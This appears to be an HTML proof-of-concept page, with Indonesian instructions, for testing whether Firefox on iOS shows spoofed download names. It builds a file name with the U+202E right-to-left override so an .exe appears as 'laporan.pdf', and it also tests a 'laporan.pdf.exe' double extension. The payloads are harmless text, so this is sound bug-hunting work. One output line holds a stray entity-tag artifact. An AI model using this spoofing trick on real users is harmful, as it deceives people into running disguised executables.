<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Test</title>
</head>
<body style="font-family: sans-serif; padding: 20px; background: #ffffff;">
  <p>Buka di Firefox iOS. Pencet tombol di bawah.</p>
  <p>Kalau popup download-nya nampilin nama file <b>laporan.pdf</b> padahal aslinya file <b>.exe</b>, berarti BUG.</p>

  <button onclick="testRTL1()" style="font-size: 20px; padding: 15px 30px;">Download File RTL (exe jadi pdf)</button>
  <br><br>
  <button onclick="testRTL2()" style="font-size: 20px; padding: 15px 30px;">Download File Double Extension</button>
  <br><br>
  <pre id="o" style="background: #f0f0f0; padding: 15px; white-space: pre-wrap;">Belum dites. Pencet tombol di atas, liat popup download-nya.</pre>

  <script>
    function downloadFile(name, content, type){
      var blob = new Blob([content], {type: type});
      var url = URL.createObjectURL(blob);
      var a = document.createElement('a');
      a.href = url;
      a.download = name;
      document.body.appendChild(a);
      a.click();
      setTimeout(function(){ URL.revokeObjectURL(url); a.remove(); }, 1000);
    }

    function testRTL1(){
      var o = document.getElementById('o');
      // Ini triknya: "laporan" + U+202E (RTL Override) + "fdp.exe"
      // Di layar, U+202E ngebalik "fdp.exe" jadi "exe.pdf", jadi keliatannya "laporan.pdf"
      // Padahal aslinya file-nya "laporan" + [RTL] + "fdp.exe" = kalau dibuka, ekstensinya .exe
      var rtl = '\u202E';
      var fakeName = 'laporan' + rtl + 'fdp.exe';
      o.innerText = "Mencoba download file dengan nama RTL:\n";
      o.innerText += "Nama asli (di kode): laporan + [U+202E] + fdp.exe\n";
      o.innerText += "Nama yang SEHARUSNYA keliatan di popup kalau Firefox AMAN: laporan‮fdp.exe (ada karakter aneh / keliatan berantakan, atau Firefox nampilin peringatan)\n";
      o.innerText += "Nama yang keliatan di popup kalau Firefox BUG: laporan.pdf (keliatan bersih kayak PDF beneran)\n\n";
      o.innerText += "Sekarang liat popup download di Firefox:\n";
      o.innerText += "1. Apakah popup-nya nampilin 'laporan.pdf'?\n";
      o.innerText += "2. Kalau iya, screenshot popup-nya. Berarti BUG - korban bisa ketipu download .exe dikira .pdf.\n";
      o.innerText += "3. Kalau popup-nya nampilin 'laporan‮fdp.exe' (berantakan) / ada peringatan 'Nama file mengandung karakter berbahaya', berarti AMAN.\n";
      downloadFile(fakeName, 'Ini file test - isinya cuma teks, bukan exe beneran. Kalau file ini ke-download, cek di Files app: ekstensinya .exe atau .pdf?', 'application/octet-stream');
    }

    function testRTL2(){
      var o = document.getElementById('o');
      // Double extension: laporan.pdf.exe - ini trik lama, tapi masih banyak yang kena kalau Firefox nyembunyiin ekstensi terakhirnya
      o.innerText = "Mencoba download file double extension:\n";
      o.innerText += "Nama: laporan.pdf.exe\n";
      o.innerText += "Kalau popup 【entity-Firefox¦canonical_name=Firefox】 cuma nampilin 'laporan.pdf' (ekstensi .exe-nya kepotong / ketutupan), berarti BUG.\n";
      o.innerText += "Kalau popup-nya nampilin full 'laporan.pdf.exe', berarti AMAN.\n";
      downloadFile('laporan.pdf.exe', 'Ini file test double extension.', 'application/octet-stream');
    }
  </script>
</body>
</html>
